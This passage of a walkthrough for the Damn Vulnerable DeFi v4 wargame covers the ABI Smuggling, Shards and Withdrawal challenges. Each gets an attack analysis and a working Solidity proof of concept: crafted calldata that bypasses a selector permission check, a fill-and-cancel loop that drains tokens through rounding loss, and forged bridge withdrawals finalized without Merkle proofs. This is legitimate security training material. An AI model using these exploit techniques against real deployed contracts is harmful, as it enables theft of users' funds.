        lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
    );
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

Run `forge test --mp test/puppet-v3/PuppetV3.t.sol --isolate` to validate test

---

## 15.ABI SMUGGLING

**Obejctive**

_from `_isSolved()` in test_

1. _All tokens taken from the vault and deposited into the designated recovery account_

**Attack Analysis**

- The vulnerability lies in the `execute()` function, which uses calldataload to extract 4 bytes of the function selector from the provided `actionData` starting at the `calldataOffset` (100 bytes). It then checks whether this ID is authorized using `getActionId()`.
- The deployer can execute `sweepFunds()` with the selector `0x85fb709d`, and the player can execute `withdraw()` with the selector `0xd9caed12`.
- The key to the exploit is bypassing the `getActionId()` check, which allows arbitrary execution of `functionCall()`.
- To craft the payload, an attacker needs to understand that in the ABI encoding of the `execute()` function, `actionData` is a dynamically sized bytes parameter.
- The value `0x80` is an offset that points to the starting position of the actual data in `actionData`. This offset is calculated relative to the start of the entire calldata.

- **POC**

See [test/abi-smuggling/ABISmuggling.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/abi-smuggling/ABISmuggling.t.sol)

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    bytes memory calldataPayload = abi.encodePacked(
        vault.execute.selector, // 4 bytes = Selector
        abi.encodePacked(bytes12(0), address(vault)), // 32 bytes = vault address padded to 32 bytes
        abi.encodePacked(uint256(0x80)), // 32 bytes = calldata start location offset
        abi.encodePacked(uint256(0)), // 32 bytes = empty data filler
        abi.encodePacked(vault.withdraw.selector, bytes28(0)), // 32 bytes = ´withdraw()´ selector
        abi.encodePacked(uint256(0x44)), // 32 bytes = Length of actionData
        abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token) // The actual calldata to `sweepFunds()`
    );

    address(vault).call(calldataPayload);
}
```

Run `forge test --mp test/abi-smuggling/ABISmuggling.t.sol --isolate` to validate test

---

## 16.SHARDS

**Obejctive**

_from `_isSolved()` in test_

1. _Balance of staking contract didn't change_
2. _Marketplace has less tokens_
3. _All recovered funds sent to recovery account_
4. _Player must have executed a single transaction_

**Attack Analysis**

- The vulnerability lies in the precision loss during payment calculation in `fill()`, specifically in `want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)`
- The calculation involves two nested divisions that can be exploited:
  1. First in `_toDVT: offer.price * _currentRate / 1e6`
  2. Then in the outer calculation: `want * (result from step 1) / offer.totalShards`
- With initial values of `offer.price` = 100_000, `_currentRate` = 1e6, and `offer.totalShards` = 100_000, any `want` value below 133 results in a payment of 0 DVT due to precision loss
- An attacker can it exploited by:

  1. Making multiple small purchases (want = 100) that cost 0 DVT due to the precision loss
  2. Using `cancel()` to return these free shards and receive DVT tokens back
  3. Repeating this process to drain the marketplace's DVT tokens

**POC**

See [test/shards/Shards.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/shards/Shards.t.sol)

```solidity
function test_shards() public checkSolvedByPlayer {
    new AttackMarketPlace(marketplace, token, recovery);
}

contract AttackMarketPlace {
    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        uint256 wantShards = 100;

        // 100 shard * 10_000
        for (uint256 i = 0; i < 10001; i++) {
            _marketplace.fill(1, wantShards);
            _marketplace.cancel(1, i);
        }

        _token.transfer(_recovery, _token.balanceOf(address(this)));
    }
}
```

Run `forge test --mp test/shards/Shards.t.sol --isolate` to validate test

---

## 18.WITHDRAWAL

**Obejctive**

_from `_isSolved()` in test_

1. _Token bridge still holds most tokens_
2. _Player doesn't have tokens_
3. _All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway_

**Attack Analysis**

- The vulnerability lies in the cross-chain message verification system between L2 and L1, specifically in how the `L1Gateway` handles withdrawal finalizations.
- The system consists of several components working together:
  1. `L2Handler` initiates messages on L2
  2. `L1Forwarder` receives and forwards messages on L1
  3. `L1Gateway` finalizes withdrawals
  4. `TokenBridge` executes the actual token transfers
- The key vulnerability is that operators can bypass Merkle proof verification in `L1Gateway.finalizeWithdrawal()`. Since the player has the `OPERATOR_ROLE`, they can:
  1. Create a forged withdrawal request to extract tokens from the bridge
  2. Process the legitimate withdrawal requests from `withdrawals.json` to maintain system state
  3. Return the tokens to meet the challenge requirements
- Even though one of the legitimate withdrawals attempts to transfer more tokens than available (causing it to fail), this failure doesn't affect the withdrawal finalization status, allowing all withdrawals to be marked as processed while maintaining bridge token balance requirements.

**POC**

See [test/withdrawal/Withdrawal.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/withdrawal/Withdrawal.t.sol)

```solidity
function test_withdrawal() public checkSolvedByPlayer {
    // fake withdrawal operation and obtain tokens
    bytes memory message = abi.encodeCall(
        L1Forwarder.forwardMessage,
        (
            0, // nonce
            address(0), //
            address(l1TokenBridge), // target
            abi.encodeCall( // message
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, // deployer receiver
                        900_000e18 //rescue 900_000e18
                    )
                )
        )
    );

    l1Gateway.finalizeWithdrawal(
        0, // nonce
        l2Handler, // pretend l2Handler
        address(l1Forwarder), // target is l1Forwarder
        block.timestamp - 7 days, // to pass 7 days waiting peroid
        message,
        new bytes32[](0)
    );

    // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.

    vm.warp(1718786915 + 8 days);
    // first finalizeWithdrawal
    l1Gateway.finalizeWithdrawal(
        0, // nonce 0
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718786915, // timestamp
        hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
        new bytes32[](0) // Merkle proof
    );

    // second finalizeWithdrawal
    l1Gateway.finalizeWithdrawal(
        1, // nonce 1
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718786965, // timestamp
        hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
        new bytes32[](0) // Merkle proof
    );

    // third finalizeWithdrawal
    l1Gateway.finalizeWithdrawal(
        2, // nonce 2
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718787050, // timestamp
        hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
        new bytes32[](0) // Merkle proof
    );

    // fourth finalizeWithdrawal
    l1Gateway.finalizeWithdrawal(
        3, // nonce 3
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718787127, // timestamp
        hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
        new bytes32[](0) // Merkle proof
    );

    token.transfer(address(l1TokenBridge), 900_000e18);
}
```

Run `forge test --mp withdrawal/Withdrawal.t.sol` to validate test. It fails with opt `--isolate` is used. TODO: Reasearch why
